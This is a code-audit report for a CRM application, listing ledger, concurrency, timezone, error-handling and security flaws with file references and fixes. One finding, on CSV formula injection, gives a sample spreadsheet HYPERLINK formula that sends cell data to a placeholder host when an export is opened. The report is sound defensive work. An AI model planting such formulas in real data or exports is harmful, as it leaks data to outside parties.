> **Audit document — generated during the full-system audit on 2026-09-14 (branch `audit/full-system-debug`).**
> File:line references point at the code as it was at commit `b2962a9`, before the audit fixes.
> Many findings below are now fixed — the authoritative status of every issue is the register in [SYSTEM_AUDIT.md](../../SYSTEM_AUDIT.md).

# Nitaq CRM — Cross-cutting Reliability Audit

Branch audited: `audit/full-system-debug` @ b2962a9 (clean tree). Read-only; no repo files changed, no DB touched.
Stack verified: Next 16.2.6, Mongoose **8.24.2**, next-auth 5 beta, papaparse, recharts. No React Query, Zod or React Hook Form in `package.json` (confirmed).
Business TZ: Asia/Dubai (UTC+4). Server assumed UTC (Vercel).

Legend: **C** = CONFIRMED by reading code (and library source where relevant); **S** = SUSPECTED (depends on data volume, deployment tier or an unread path).

---

## 1. Issue table

| ID | Sev | Category | File:line | Problem | Concrete failure scenario | Minimal safe fix | C/S |
|---|---|---|---|---|---|---|---|
| REL-01 | P0 | Ledger integrity / error handling | `app/api/payments/[id]/route.ts:91-99,106`; `node_modules/mongoose/lib/helpers/query/castUpdate.js:459-462` | On edit, the receipt JE is reversed, then `update.journalEntryId = undefined` is sent via `findByIdAndUpdate`. Mongoose 8 **drops undefined keys from `$set`**, so `journalEntryId` stays set and the "re-post" branch (`!payment.journalEntryId`) never runs. `"datePaid" in update` counts as a money change even when the value is unchanged, and the Receipts page always sends `datePaid`. | Finance fixes a typo in the notes of received payment P-120 (AED 2,500). The receipt JE is reversed and nothing is reposted. Cash and A/R are now off by 2,500 and the UI shows "saved". | Use `$unset: { journalEntryId: 1 }` (or `null`). Compare `datePaid` by value. Decide on reposting by querying for an active JE, not the stale field. Do it all in one transaction. | C |
| REL-02 | P0 | Ledger integrity | `app/api/expenses/[id]/route.ts:71-79,92`; `app/(dashboard)/expenses/page.tsx:122` (`...form` always includes `expenseDate`) | Same undefined-strip bug. Every expense edit from the UI reverses the expense JE and never reposts it. | Any edit to an expense removes it from the P&L, trial balance and VAT input. | Same as REL-01. | C |
| REL-03 | P0 | Financial logic | `app/api/payments/route.ts:72-76,105-117`; `lib/accounting/postings.ts:119-148`; `app/(dashboard)/dashboard/page.tsx:166-174`; `app/api/reports/export/route.ts:21` | `paymentType: "Refund"` with `status: "Received"` is accepted and auto-posted as a **customer receipt** (Dr Cash / Cr A/R). Dashboard revenue and the CSV business report count it as income. | A AED 1,000 refund raises cash, lowers A/R and adds 1,000 of "revenue", instead of the opposite. | Reject Refund here, or post a proper refund entry (Dr A/R or Refunds, Cr Cash) and exclude refunds from every revenue query. Delegate to accounting-engineer. | C |
| REL-04 | P1 | Concurrency / idempotency | `app/api/teacher-payouts/route.ts:86,110-158,177-188` | The payout recomputes unpaid sessions (a read), creates the payout, then stamps sessions with `updateMany({_id:{$in}})` with no `payoutId: null` guard. There is no transaction and no idempotency key. If the ledger post fails, it still returns 201. | Two tabs, or a retry after a timeout, both see the same 12 unpaid sessions. Result: two TP-numbers, two salary JEs, and the trainer is paid twice. | Claim sessions atomically first with `updateMany({_id:{$in}, payoutId:null}, {$set:{payoutId}})`, check `modifiedCount`, then create the payout and JE in a transaction. Add an idempotency key. | C |
| REL-05 | P1 | Concurrency | `app/api/enrollments/[id]/route.ts:74-76,202-243` | `amountPaid` delta logic: read `existing.amountPaid`, update, then create a Payment and receipt JE for the delta. | Double-click or two tabs setting amountPaid from 0 to 900: both compute delta 900, so two Payments and two receipts. Cash is overstated by 900. | Optimistic concurrency with `findOneAndUpdate({_id, amountPaid: old}, …)`, or remove direct `amountPaid` edits (see REL-06). | C |
| REL-06 | P1 | Duplicated source of truth | `app/api/payments/route.ts:85-102` (never touches Enrollment); `enrollments/route.ts:189-225`; `enrollments/[id]/route.ts:205-243`; consumers: `lib/serializers.ts:118`, `app/api/collections/route.ts:20-37`, `finance/page.tsx:128-134`, `reports/page.tsx:119-144`, `dashboard/page.tsx:144-147,221` | "Money received" lives both in `Enrollment.amountPaid` and in the `Payment` collection plus the ledger. Payments recorded on the Receipts page never update `amountPaid`. Raising `amountPaid` creates a Payment; lowering it creates nothing. | Finance records AED 900 against E-004 on Receipts, so ledger A/R drops. Collections still chases 900. A manager then "fixes" `amountPaid` to 900, creating a second Payment and receipt, so cash is double counted. | Treat Payments as canonical. Derive `amountPaid` by aggregation, or update both in one transaction. Make `amountPaid` read-only in the UI and PATCH. | C |
| REL-07 | P1 | Transactions | No `startSession`/`withTransaction` anywhere (grep). Multi-document writes: `enrollments/route.ts:111-225`, `enrollments/[id]/route.ts:202-260,285-288`, `payments/route.ts:85-121`, `payments/[id]/route.ts:96-123,142-145`, `expenses/route.ts:76-104`, `expenses/[id]/route.ts:78-108,128-131`, `teacher-payouts/route.ts:114-176`, `accounting/supplier-bills/route.ts:63-91`, `accounting/supplier-payments/route.ts:53-90`, `leads/[id]/route.ts:144-212`, `class-sessions/route.ts:124-143` (+ `lib/hours.ts:56-57`), `lib/accounting/engine.ts:190-219` (reversal create + original save), `lib/accounting/postings.ts:53-68`, `accounting/receivables/route.ts:75-100`, `accounting/backfill/route.ts` | Any failure midway leaves partial state. | The reversal JE is created, then `original.save()` fails: both entries stay Posted and the ledger nets to zero with no link. The Payment is created but the JE fails: the receipt is off-ledger (REL-08). The enrollment is deleted but the invoice reversal fails. | Add `withTransaction(fn)` in `lib/db.ts` and thread a `session` through the engine and postings. Atlas is a replica set, so transactions are available (S: tier not verified). Tests need `MongoMemoryReplSet` (`tests/helpers/db.ts:17` uses a standalone server). | C |
| REL-08 | P1 | Error handling (critical side effect) | `lib/accounting/postings.ts:258-264` (`postSafely`); callers `payments/route.ts:106`, `payments/[id]/route.ts:97,107,145`, `enrollments/route.ts:178,210`, `enrollments/[id]/route.ts:228,248,250,288`, `expenses/route.ts:90`, `expenses/[id]/route.ts:78,93,131`, `supplier-bills/route.ts:77`, `supplier-payments/route.ts:77` | Posting and reversal failures become `console.error(message)` (no stack, no correlation id), `null`, then HTTP 200/201. Nothing is flagged on the source document and nothing is audited. On a fee change, a failed reversal makes the repost hit the duplicate guard silently (`enrollments/[id]:247-259`). | An inactive account, a lock date, or a missing COA account means payments save without JEs for weeks. The trial balance diverges from Receipts and nobody is told. | Persist `postingStatus` and `postingError` on the source document. Return `warning` in the response (the payouts route already does this). Add a reconciliation view of CRM documents with no active JE, plus a retry job. | C |
| REL-09 | P1 | Concurrency (ledger) | `lib/accounting/engine.ts:54-62` (drops unique index), `:118-135` (dup-source read-then-create), `:163-173` (post), `:185-219` (reverse) | Guards are check-then-act. | An accountant clicks Reverse in two tabs (the per-tab `actioning` guard doesn't help), producing two reversal JVs. The account goes negative and the original's `reversedByEntryId` is overwritten. Backfill running concurrently with a CRM post can double-post. | Claim atomically with `findOneAndUpdate({_id, status:"Posted", reversedByEntryId:{$exists:false}}, {$set:{status:"Reversing"}})`. Add a partial unique index on `{sourceType, sourceId}` where status is in `[Draft, Posted]`. | C |
| REL-10 | P1 | Concurrency | `lib/accounting/postings.ts:46-69` | `ensureStudentArAccount` reads `arAccountCode`, then creates a COA account and saves. | Concurrent postings for one student (receipt from a second tab, or A/R migration during a payment) create two A/R accounts. Lines split across them and Receivables shows two partial balances. | Conditional `findOneAndUpdate({_id, arAccountCode:{$exists:false}})` claim before creating the account, or a deterministic code. | C (logic) / S (frequency) |
| REL-11 | P1 | Connection handling | `lib/db.ts:27-33` | A rejected `mongoose.connect` promise stays cached in `globalThis.mongooseCache`. There are no `serverSelectionTimeoutMS` or `maxPoolSize` options. | An Atlas blip during a cold start breaks every request in that warm lambda (API and server pages) until it is recycled. Dashboards show "Couldn't reach the database". | `try { cached.conn = await cached.promise } catch (e) { cached.promise = null; throw e }`. Set timeouts and pool size. | C |
| REL-12 | P1 | Period lock / dates | `lib/accounting/engine.ts:111`, `:163-173`; `app/api/accounting/settings/route.ts:70`; `app/api/accounting/journal-entries/[id]/route.ts:88` | `lockDate` is stored as UTC midnight of the lock day, but posting compares it to full instants. `postJournalEntry` never checks the lock, and editing a draft can move its date into a locked period. | Books locked up to 2026-08-31. An auto-invoice stamped `2026-08-31T09:00Z` passes. A September draft is re-dated to 15 Aug and posted, changing a closed month. | Compare Dubai calendar dates (`dubaiDate(input.date) <= lockDate`). Enforce in create, post and draft edit. | C |
| REL-13 | P1 | Audit / security | `lib/audit.ts:13-24`; missing callers: `payments/route.ts` POST, `expenses/route.ts` POST, `expenses/[id]/route.ts` PATCH/DELETE, `users/route.ts:51` POST, `users/[id]/route.ts:11-87` PATCH (role, active, password reset)/DELETE, `courses/*`, `teachers/*` (pay rates), `attendance/*`, `enrollment-requests/[id]` PATCH, `admin/backfill-payments`, `admin/migrate-roles`, `settings/route.ts`, `import/[entity]`, `leads/import`, all exports | Fire-and-forget, never awaited, failures swallowed. On serverless, work after the response may never run. Required `userName`/`entityLabel` validation failures are also swallowed. There are no before/after values. Several critical writes have no audit call at all. | An admin promotes a user to admin, resets a password, deletes a user, or finance deletes an expense: none of it is recorded. Journal reversal, payment delete and impersonation audits can silently vanish. | Await the audit write inside the business transaction (or `after()` from next/server with retry). Add the missing calls, structured `before`/`after`, and correlation id. | C |
| REL-14 | P1 | Data integrity | `app/api/enrollments/[id]/route.ts:285-288`; `payments/[id]/route.ts:142-145`; `expenses/[id]/route.ts:128-131` | Financial and business records are hard-deleted. Deleting an enrollment reverses only its invoice. Linked Payments and receipt JEs, ClassSessions, HourAdjustments, LearnerProfile and payout lines are orphaned. Payment and expense deletes happen **before** the reversal, so a failed reversal leaves the ledger entry with no source. | Deleting E-010 (paid 1,500) leaves the student's A/R at a credit of -1,500. Payroll preview shows "Unknown student" sessions. | Soft-void (status `Cancelled`, reason, who). Block deletion when payments or sessions exist. Reverse and void in one transaction. | C |
| REL-15 | P1 | Import (financial) | `app/api/import/[entity]/route.ts:121-160,231-286`; `app/(dashboard)/import-export/ImportExportClient.tsx:173` | Payment, expense and enrollment imports skip ledger posting, enrollment linkage, `amountPaid`/Payment consistency and duplicate detection. There is no server dry run, no transaction and no audit. The client "validation" only checks the first two template columns (payments: studentName and studentPhone, **not amount**). | Re-importing a payments CSV doubles cash receipts in Reports while Finance (ledger-based) doesn't move. A later "Accounting backfill" posts them all with their original dates. Rows in locked periods fail and are reported as "skipped (already posted or invalid)". | Disable financial imports, or route each row through the same service as POST (posting, external-ref unique key). Add a dry-run endpoint, a per-row transaction and an audit summary. | C |
| REL-16 | P1 | Timezone (client "today") | `payments/page.tsx:39`, `expenses/page.tsx:27`, `classes/page.tsx:43`, `teacher-payouts/page.tsx:55,84`, `accounting/journal/page.tsx:84,153`, `accounting/suppliers/page.tsx:69-70`, `components/accounting/EntryListPage.tsx:65,90`, `components/shared/ClassHistoryDrawer.tsx:78`, `components/leads/LeadsClient.tsx:133,661`, `follow-ups/page.tsx:66` | Defaults use `new Date().toISOString().slice(0,10)`, which is the UTC date. Three are module-level constants, frozen when the tab loads. | At 01:30 Dubai on 1 Oct, the receipt, expense, payout and JV default to **30 Sep**, landing in the wrong month or VAT quarter, possibly a locked period. A tab left open overnight defaults to yesterday. | A shared `todayDubai()` using `Intl.DateTimeFormat('en-CA', {timeZone:'Asia/Dubai'})`, computed at form-open time. | C |
| REL-17 | P1 | Timezone (stored instants vs date-only) | `models/Enrollment.ts:86`; `models/Financial.ts:145`; `enrollments/route.ts:181,206,213`; `enrollments/[id]/route.ts:224,231`; `expenses/route.ts:80`; `class-sessions/route.ts:130`; `teacher-payouts/route.ts:112`; `lib/accounting/engine.ts:193`; serializers `lib/serializers.ts:171,189,206,249`; filters `lib/dateRange.ts:106-114`, `payments/route.ts:36-40`, `leads/route.ts:94-99`, `reports/export/route.ts:25-26`, `reports/page.tsx:29-37,78-80` | Date-only picks are stored as UTC midnight (consistent). Server defaults store full instants. Both are rendered with `toISOString().slice(0,10)` and filtered by UTC-midnight bounds. | An enrollment created with a first payment at 02:00 Dubai on 1 Oct has `datePaid`/`registrationDate` of 30 Sep 22:00Z. The receipt and invoice JEs are dated September, revenue counts in September, and "today's" leads filter misses it. | Store business dates as Dubai-midnight (`${d}T00:00:00+04:00`), or as date-only strings plus an instant. Build filter bounds with a +04:00 offset in a single helper. | C |
| REL-18 | P2 | Timezone (server "today"/"month") | `dashboard/page.tsx:76-77,268,288`; `follow-ups/route.ts:58-73`; `reports/page.tsx:43-45,84`; `finance/page.tsx:55,91,102,142-145`; `accounting/dashboard/route.ts:16-17`; `my/students/route.ts:31-36` | `setHours(0)`, `new Date(y,m,1)` and `$year`/`$month` all evaluate in UTC. | 00:00-03:59 Dubai: "Today's follow-ups" lists yesterday's and overdue counts lag. On the 1st of the month the dashboard's default "This Month" and "revenue this month" show the previous month. The monthly chart buckets by UTC month. | `dubaiDayBounds()` / `dubaiMonthStart()` helpers. `{$month:{date:"$datePaid", timezone:"Asia/Dubai"}}`. | C |
| REL-19 | P2 | Ledger report | `lib/accounting/engine.ts:291-297`; `app/api/accounting/ledger/route.ts:24-30` | With `from` set, the running balance starts at 0, ignoring opening balance and earlier movement. | Bank ledger for October shows a closing balance equal to October's net movement, not the actual bank balance. | Seed the balance with opening plus `aggregateBalances(undefined, from-1)` for that account. | C |
| REL-20 | P2 | Error leakage | ~60 handlers `catch (error) { return {message: error.message} }`, e.g. `payments/route.ts:125-127`, `enrollments/route.ts:229-231`, `users/route.ts:46-47,79-80`, `users/[id]/route.ts:59-60,84-85`, `admin/impersonate/route.ts:84-86`, `admin/migrate-roles/route.ts:31-34`, `accounting/journal-entries/route.ts:110-113` | Mongoose ValidationError/CastError, E11000 (index name and duplicate value, e.g. an email) and server-selection errors (cluster host) go to the client. A DB outage returns **400**. Only `export/[entity]:164-166` and `settings/route.ts` do it correctly. | A user sees `E11000 duplicate key error collection: nitaq.users index: email_1 dup key: {...}` or `MongoServerSelectionError: ... cluster0-shard-00-01...`. | `toApiError(err)`: AccountingError and known validation map to 400 with a safe text. Everything else returns 500 with a generic message and `console.error` with a correlation id. | C |
| REL-21 | P2 | Input validation | `payments/route.ts:69,99`; `payments/[id]/route.ts:57`; `expenses/[id]/route.ts:54`; `follow-ups/route.ts:121`; `enrollments/route.ts:122-125`; `courses/[id]/route.ts:77`; `notifications/route.ts:48`; `import/[entity]/route.ts:39`; `lib/accounting/engine.ts:84-92` | No Zod. `Number("abc")` gives NaN, which passes `<= 0`, so the CastError text leaks. `"1e309"` becomes Infinity, which passes and `createJournalEntry` accepts it (no `isFinite`). An unvalidated `enrollmentId`/`leadId` produces a CastError. `req.json()` outside try, and routes with no try (`teacher-payouts` GET, `class-sessions` GET, most accounting GETs), return framework 500s. Unknown fields aren't rejected. | A malformed `enrollmentId` on a receipt shows "Payment validation failed: enrollmentId: Cast to ObjectId failed…". `amount:"1e309"` can post a JE of Infinity (S). | Zod schemas per route: `z.coerce.number().finite().positive()`, round to 2 decimals, an `objectId` refinement, `.strict()` for writes. | C (NaN/CastError) / S (Infinity JE) |
| REL-22 | P2 | Security (auth) | `lib/api-auth.ts:26-29` | If the DB read fails, the live user check fails **open** to the JWT role. The cache is per instance for 60 s. | During a DB blip, a deactivated or demoted user keeps full token-role API access. | Fail closed for writes (503). Keep fail-open only for GETs if desired, and log it. | C |
| REL-23 | P2 | Frontend error handling | 131 `fetch(` vs 68 `.ok` checks. `payments/page.tsx:103-107,219-221`; `expenses/page.tsx` (4 fetches, 0 checks); `LeadsClient.tsx:574-589,639-647,673-690`; `ImportExportClient.tsx:194-200,212-214`; `accounting/page.tsx` (5/0); `accounting/receivables/page.tsx`; `collections/page.tsx`; `NotificationPanel.tsx`; `LeadsClient.tsx:295-299` (`.catch(()=>{})`) | Non-2xx responses are treated as success or as empty data. | A manager or finance user deletes a receipt: DELETE is admin-only (`payments/[id]:134`) and returns 403, but the dialog closes as success and the row reappears. A 500 on payments shows "No receipts found". A failed lead convert still navigates to /enrollments. A bulk follow-up where 3 of 10 got 400 reports "Created 10". | A shared `apiFetch()` that throws on `!res.ok` with the server message. Hide DELETE for non-admins. | C |
| REL-24 | P2 | Idempotency / duplicates | `leads/route.ts:150-161` (read-then-create, no unique phone); `leads/[id]/route.ts:183-201` (no unique `Enrollment.leadId`); `payments/route.ts` POST; `expenses/route.ts` POST; `supplier-bills`/`supplier-payments` POST; `class-sessions/route.ts:124` with `models/ClassSession.ts:63-66` (unique only when `startTime` set) | In-flight button disabling exists (payments:429, expenses:314, enrollments:324, payouts:293, journal:486-536). There is no server idempotency, so a retry after a client timeout, a second tab, or a double Enter duplicates records. | A slow network: the POST succeeds but the client times out and the user clicks again, so there are two receipts and two JEs. Two users convert the same lead and two enrollments are created. A class without start time submitted twice consumes the hours twice. | `Idempotency-Key` header stored with a unique index (24 h TTL). Unique partial index on `Enrollment.leadId`. Normalised-phone unique (or soft) index on Lead. | C |
| REL-25 | P2 | Frontend data freshness / races | `payments/page.tsx:93-127,158,205-206`; server pages with no revalidation (`dashboard`, `finance`, `reports`); `router.refresh` used only in `app/impersonate/page.tsx:30` and `LoginForm.tsx:64`; `AbortController` only in `GlobalSearch.tsx:83` | Enrollments are fetched once on mount, so balances go stale after recording a receipt. The installment number is suggested from the *currently filtered* payment list. Filter-driven fetches have no abort or sequence guard. | The user changes the date range twice quickly and a slower older response overwrites the newer one, so totals don't match the filter. Instalment "1" is suggested for what is really the third payment (earlier ones are outside this month). | Abort in effect cleanup (or a request-id guard). Refetch enrollments after saving. Compute the instalment server-side from all Payments for the enrollment. | C |
| REL-26 | P2 | Validation consistency | `leads/route.ts:150-151` vs `import/[entity]/route.ts:71` vs `leads/import/route.ts:67-107` (no dup check); `models/Lead.ts:59` (email regex only on Lead); `payments/route.ts:90` and `enrollments/route.ts:122-123` (amounts not rounded) vs `engine.ts:84` (rounded) | Phone normalisation, email validation, duplicate rules and 2-decimal money rounding differ per entry path. | `+971 50 123 4567` and `+971501234567` become two leads. A payment of 100.005 is stored unrounded while the JE posts 100.01, so sub-ledger and GL differ by a fils. | A single `lib/validation` (Zod) module shared by POST, PATCH and import. Store money as integer fils or `Decimal128`. | C |
| REL-27 | P2 | Silent no-op updates | 31 sites of `update[f] = … \|\| undefined`, e.g. `enrollments/[id]/route.ts:81,103,111,117-118`, `payments/[id]/route.ts:51,76`, `expenses/[id]/route.ts:57,60,63`, `leads/[id]/route.ts:55,82`, `follow-ups/[id]/route.ts:63,79`, `attendance/[id]/route.ts:69,71`; stripped by `castUpdate.js:459-462` | Clearing an optional field is ignored. | A manager clears a registration's trainer pay rate ("revert to trainer default"). The old rate stays and the payout still uses it. Cleared due dates and notes reappear. | Build `$unset` for cleared keys. | C |
| REL-28 | P2 | CSV formula injection | `lib/utils.ts:64-67` (`csvEscape`); `leads/export/route.ts:62-70`; `reports/export/route.ts:58-78`; `ImportExportClient.tsx:149,220` (`Papa.unparse` without `escapeFormulae`); `collections/page.tsx:72`; `accounting/gl-dump/route.ts` | Values starting with `= + - @ \t \r` are not neutralised. | A lead imported with a name like `=HYPERLINK("http://x/?"&A1,"Open")` runs when finance opens the export in Excel. | Prefix `'` when `/^[=+\-@\t\r]/`, and pass `escapeFormulae: true` to Papa. Keep negative-number columns numeric. | C |
| REL-29 | P2 | Import limits / partial import | `leads/import/route.ts:46-107` (no file-size or row cap; `Lead.create` not in a per-row try); `import/[entity]/route.ts:65-306` (500 rows × 3-4 sequential queries); `accounting/journal-entries/import/route.ts:24` (no cap); `import/[entity]/route.ts:114` (sales can assign follow-ups to anyone; no `createdBy`) | Imports are partial and non-resumable, and a retry duplicates rows. | A 2,000-row leads CSV: row 812 hits a DB error, so 811 are created and the response is 500. A re-upload creates 811 duplicates (no dup check on this route). A large generic import times out on Vercel mid-way. | Row and byte caps, per-row try, duplicate check. A background job or chunked import with an import batch id to allow rollback. | C |
| REL-30 | P2 | Concurrency (supplier) | `accounting/supplier-payments/route.ts:67-73` | Bill `amountPaid` is updated read-modify-write, with no check against the outstanding amount. | Two payments on the same bill at the same time lose one update. Overpayment is accepted and the bill is marked Paid. | `$inc` with a condition `amountPaid + amt <= totalAmount`, in a transaction with the JE. | C |
| REL-31 | P2 | Journal validation parity | `accounting/journal-entries/[id]/route.ts:92-118`; `lib/accounting/engine.ts:167` | Draft edits skip the debit-and-credit-on-one-line check, zero lines, <2 lines, inactive accounts and the lock date. Post trusts the stored totals. | A draft edited to one line of Dr 0 / Cr 0 plus one balanced pair is posted, leaving junk zero lines (and inactive accounts) in the ledger. | Reuse `createJournalEntry`'s validator for draft edit and post. | C |
| REL-32 | P2 | Performance (unbounded) | `leads/route.ts:123`, `enrollments/route.ts:75`, `payments/route.ts:47-49`, `expenses/route.ts:43-44`, `follow-ups/route.ts:75`, `attendance/route.ts:47`, `teachers/route.ts:33`, `courses/route.ts:35`, `collections/route.ts:20-32`, `my/students/route.ts:29`, `export/[entity]/route.ts:38-148`, `leads/export/route.ts:56`, `accounting/vat-report/route.ts:30`, `engine.ts:291`, `payments/page.tsx:118` | Full-collection reads with client-side pagination (`usePagination`), totals computed in JS, unanchored case-insensitive regex search (collection scans). | After roughly 20k leads or payments, list APIs return multi-MB JSON and exports approach the Vercel memory/time limits. | Server pagination (`limit`/cursor), `$group` totals in Mongo, anchored or text search, streamed CSV. | C (pattern) / S (threshold) |
| REL-33 | P3 | Performance (N+1) | `teacher-payouts/route.ts:28-40` + `lib/payroll.ts:72,132,159`; `dashboard/page.tsx:196-212`; `accounting/backfill/route.ts:39-102`; `admin/backfill-payments/route.ts:26-27`; `accounting/receivables/route.ts:77-80`; `import/[entity]/route.ts:71,130,201` | Queries run inside loops. | 30 trainers means about 90+ queries per payouts page load. The dashboard runs 6 counts per sales user plus about 15 other queries on every render. | Batch with a single aggregation grouped by teacher/owner. Cache dashboard tiles (`use cache` / revalidate). | C |
| REL-34 | P3 | Performance (heavy aggregation / indexes) | `reports/page.tsx:75-145` (18 aggregations, several unfiltered); `finance/page.tsx:15-31,72,85`; `accounting/dashboard/route.ts:19-23`; missing indexes: `Payment.enrollmentId`, `Lead.phone`, `Lead.assignedTo/createdBy`, `FollowUp.leadId`, `Enrollment.leadId`/`teacherIds`, `ClassSession.payoutId` | All-time ledger scans on every request. | The Finance page's latency grows with the JournalEntry count, and the collections `$group` scans all Payments. | Add indexes. Precompute period balances or cache with tag revalidation on posting. | S |
| REL-35 | P3 | Serialization drift | `lib/serializers.ts:60` (`priceInclVat` `Math.round` to whole AED), `:118` (balance clamped at 0 hides overpayment), `:177-198` (Payment lacks `journalEntryId`), `:200-215` (Expense lacks `vatRate`/`vatAmount`/`amountBeforeVAT`/`supplierId`); raw docs returned: `accounting/journal-entries/[id]/route.ts:39,65,71,80,121`, `journal-entries/route.ts:109`, `supplier-bills/route.ts:100`, `supplier-payments/route.ts:99`, `activity/route.ts:26`; 29 `any` in serializers | Model changes don't surface at compile time. Money shown to the user is rounded. The UI can't show unposted receipts or edit expense VAT (the PATCH keeps the old `vatRate` forever, `expenses/[id]:82`). | A course priced 99.99 + 5% VAT shows 105 instead of 104.99. An overpaid student shows balance 0. | Typed serializers (`FlattenMaps<ILean…>`) and DTOs for accounting routes. Add the missing fields and 2-decimal money. | C |
| REL-36 | P3 | Duplicated business logic | See §4 | Balance, revenue, date-range, ownership, trainer-scope and VAT-split rules are implemented 3-9 times with different results. | The Dashboard, Finance, Reports and Collections pages show three different "outstanding" figures, and revenue differs by whether refunds and cash vs accrual are counted. | Extract `lib/metrics/*` (outstanding, revenue, dateRange, scope) and use it everywhere. | C |
| REL-37 | P3 | Counters | `models/Counter.ts:12-19`; callers take a sequence before validation or create, e.g. `payments/route.ts:79-85`, `enrollments/route.ts:108-111`, `engine.ts:131-135`, `import/[entity]:77,136,241,271` | Numbers are burned on failure, leaving gaps in P-/EXP-/JV-/TP- series. The first-ever `findByIdAndUpdate(upsert)` on a new counter name can race to E11000 (surfaced via REL-20). | Import failures leave gaps in receipt numbering, which is awkward for a VAT audit trail. A new counter under concurrent first use returns a 400 with a raw duplicate-key message. | Validate before taking a sequence. Take it inside the transaction. Retry the upsert on 11000. Pre-seed counters. | C |
| REL-38 | P3 | Hours / payroll race | `class-sessions/route.ts:113-143`; `lib/hours.ts:53` | The remaining-hours check reads `completedHours` then inserts. The recalculation clamps to the total while payroll still pays every session. | Two trainers record the last 2 h at once: 4 h delivered, completed hours clamped to the total, the student is not over-charged, but the trainer is paid for 4 h. | Conditional `$inc` on the enrollment inside a transaction. | C |
| REL-39 | P3 | Swallowed page errors | `dashboard/page.tsx:158,241-243`; `reports/page.tsx:170-172`; `finance/page.tsx:182-184`; `lib/accounting/engine.ts:61`; `auth.config.ts:21` | `catch { return null }` with no logging. | A query bug (e.g. a bad `$expr`) looks like a DB outage ("Couldn't reach the database") and leaves nothing in the logs. | Log with a correlation id and distinguish connectivity errors from query errors. | C |
| REL-40 | P3 | Rate limiting / side effects | `auth.ts:57` (only limiter, in-memory per instance); none on `admin/impersonate`, `export/*`, `leads/export`, `reports/export`, `import/*`, `search`, `users/me/2fa`; `lib/notify.ts:15-21` fire-and-forget | Expensive and sensitive endpoints are unthrottled. Notifications can be lost. | Scripted export of all PII (Emirates IDs) by a compromised finance or sales account, unthrottled and unaudited. | Durable rate limit (Upstash/Vercel KV) on auth, exports, import and 2FA. Audit exports. Send notifications through `after()` or a queue. | C (limits) / S (2FA route not read in full) |
| REL-41 | P4 | Static analysis | see §5 | 54 `any`, 10 eslint-disables (4 exhaustive-deps), `as never` in money paths, `eslint-config-next` 15.1.3 against next 16.2.6 | Stale closures in the journal, notifications and leads effects. Lint rules may not match Next 16. | Type the serializers. Remove `as never`. Bump `eslint-config-next`. | C |

---

## 2. Error handling inventory (section 1 of brief)

### Server-side catch sites (app/api, lib, auth, models)
| Location | Pattern | Class |
|---|---|---|
| `lib/audit.ts:23` | `.catch(() => {})` on un-awaited create | **critical** (audit loss) — REL-13 |
| `lib/notify.ts:21` | `.catch(() => {})` un-awaited | retryable / user-facing (lost notification) |
| `lib/accounting/postings.ts:261-263` | `postSafely` log message + return null | **critical** — REL-08 |
| `lib/accounting/engine.ts:61` | `catch {}` around index drop | safe-to-ignore (but the design itself is REL-09) |
| `lib/api-auth.ts:26-29` | fail-open | **security** — REL-22 |
| `app/api/accounting/backfill/route.ts:53,76,101` | `catch { failed++ }` | user-facing (errors conflated as "already posted or invalid"), critical for lock-date failures |
| `app/api/teacher-payouts/route.ts:177-188` | ledger failure → 201 + warning + fire-and-forget audit | **critical** (payout persisted, ledger missing; audit may be lost) |
| `app/api/import/[entity]/route.ts:92,117,157,188,227,257,282,303` | per-row `e.message` to client | user-facing + leak |
| `app/api/accounting/journal-entries/import/route.ts:86` | per-voucher `err.message` | user-facing |
| `app/api/export/[entity]/route.ts:18` | `catch { return "" }` on date format | safe-to-ignore |
| `app/api/export/[entity]/route.ts:164` | logs + generic 500 | correct pattern |
| `app/api/settings/route.ts:27,83` | generic message, no log | user-facing (no diagnostics) |
| ~55 route `catch (error) { return {message: error.message}, 400|500 }` | leak + wrong status | **security/user-facing** — REL-20 |
| `auth.ts:64,97,120` | rethrow typed CredentialsSignin | correct |
| `auth.config.ts:21` | ignore URL parse | safe-to-ignore |
| `app/(dashboard)/dashboard/page.tsx:158,241`, `reports/page.tsx:170`, `finance/page.tsx:182` | `catch { return null }` | user-facing, no logging — REL-39 |

Client-side: `LeadsClient.tsx:299 .catch(() => {})` (safe-ish degrade), plus ~63 fetches without `.ok` (REL-23). `void promise` usages are all UI handlers that manage their own state (safe).

`console.*` in runtime code: only `lib/accounting/postings.ts:262` and `app/api/export/[entity]/route.ts:165` (scripts excluded). No structured logging and no correlation ids.

### Critical operations and audit coverage
| Operation | Route | Audit call | Can succeed with no audit record? |
|---|---|---|---|
| Record payment | `POST /api/payments` | **none** | Yes, always |
| Edit / delete payment | `payments/[id]` PATCH/DELETE | fire-and-forget | Yes (lost silently) |
| Journal create/post/reverse/cancel | `journal-entries`, `[id]` | fire-and-forget | Yes |
| JV import / backfill / A/R migration | respective routes | fire-and-forget | Yes |
| Expense create/edit/delete | `expenses`, `[id]` | **none** | Yes, always |
| Supplier bill / payment | routes | fire-and-forget | Yes |
| Teacher payout | `teacher-payouts` POST | fire-and-forget | Yes |
| Enrollment create/update/delete | `enrollments`, `[id]` | fire-and-forget | Yes. Deletion also has no before-state. |
| Enrollment "cancel" | there is no cancel; status PATCH is audited fire-and-forget | Yes |
| User create / role change / deactivate / password reset / delete | `users`, `users/[id]` | **none** | Yes, always |
| 2FA enable/disable | `users/me/2fa` | fire-and-forget | Yes |
| Impersonation start / exit | `admin/impersonate`, `impersonate/exit` | fire-and-forget | Yes. Token redemption itself (`auth.ts:126-131`) is atomic but not audited. |
| Accounting settings (incl. lock date) | `accounting/settings` PATCH | fire-and-forget, **no detail of what changed** | Yes |
| Academy settings | `settings` PATCH | **none** | Yes |
| Role migration | `admin/migrate-roles` | **none** | Yes |
| Bulk import (any entity) / exports | `import/*`, `leads/import`, `export/*` | **none** | Yes |

---

## 3. Dates / timezone notes (section 2 of brief)

Two conventions are mixed:
1. **Date-only picks** (DatePicker → `YYYY-MM-DD` → `new Date("YYYY-MM-DD")` = UTC midnight) round-trip correctly through `toISOString().slice(0,10)` and the UTC range filters. Payment `datePaid` entered on the form, expense date, follow-up date, class date, JV date, supplier dates and lock date all behave this way.
2. **Instants** (`new Date()`, `Date.now`, `createdAt`) are formatted and filtered by UTC day. They are wrong for records created 00:00-03:59 Dubai (REL-17).

`lib/dateRange.ts`:
- `getPresetRange` uses local time. That is fine in the browser, but `thisMonthRange()` is also called **server-side** in `dashboard/page.tsx:268`, so the default dashboard filter follows the UTC month (REL-18).
- `buildDateFilter` (`:106-114`) uses UTC bounds. It is consistent with date-only fields and off by 4 h for instants.
